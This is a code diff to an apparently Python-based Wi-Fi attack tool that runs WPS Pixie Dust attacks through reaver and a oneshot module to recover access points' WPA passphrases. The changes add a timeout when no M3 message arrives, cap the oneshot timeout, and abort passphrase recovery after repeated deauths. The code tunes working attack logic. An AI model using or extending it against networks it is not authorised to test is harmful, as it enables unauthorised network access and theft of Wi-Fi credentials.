@@ -62,6 +62,7 @@ GETPSK_COOL_SEC = 8
 PIN_HOLD_SEC = 12
 BEACON_SOFT_SEC = 15
 ASSOC_SOFT_SEC = 35
+NO_M3_SOFT_SEC = 18  # M1 seen but no M3 — don't burn full pixie timeout
 
 _STDBUF = shutil.which("stdbuf") or (
     "/usr/bin/stdbuf" if os.path.exists("/usr/bin/stdbuf") else None)
@@ -308,6 +309,15 @@ def _reaver_pixie(mon, target, req, emit, stop_flag):
                     emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                      detail="no assoc"))
                     break
+                # Got M1 but never M3/pixie — AP isn't handing pixie material.
+                if (t_m1 is not None and t_m3 is None and t_pixie is None
+                        and (now - t_m1) > NO_M3_SOFT_SEC):
+                    fail_reason = "no m3"
+                    tools.log("wps SOFT: no M3 %.0fs after M1 %s" % (
+                        now - t_m1, bssid))
+                    emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
+                                     detail="no m3"))
+                    break
 
             if not saw_beacon:
                 phase, left, mx = ("BEACON",
@@ -483,10 +493,11 @@ def pixie(mon, target, req, emit, stop_flag, run_id=None, iface_name=None):
             and not (stop_flag and stop_flag.is_set())):
         methods_tried.append("oneshot_pixie")
         managed = None
+        oshot_t = min(oneshot_wps.ONESHOT_MAX_SEC, timeout)
         try:
             managed = _to_managed(mon, iface_name or mon)
             o = oneshot_wps.run_pixie(managed, target, emit, stop_flag,
-                                      timeout=timeout)
+                                      timeout=oshot_t)
         except Exception as e:  # noqa: BLE001
             o = {"ok": False, "reason": str(e)[:20], "t": 0.0}
         finally:
@@ -668,6 +679,7 @@ def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
     start = time.time()
     psk = None
     fail_detail = None
+    deauths = 0
     fd = proc.stdout.fileno()
     try:
         while (time.time() - start) < timeout:
@@ -692,6 +704,11 @@ def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
             if got is not None:
                 psk = got
                 break
+            if re.search(r"Received deauth", line, re.I):
+                deauths += 1
+                if deauths >= 2:
+                    fail_detail = "deauth"
+                    break
             if re.search(r"rate limiting", line, re.I):
                 continue
             if HARD_LOCK_RE.search(line) and not ignore_locks:
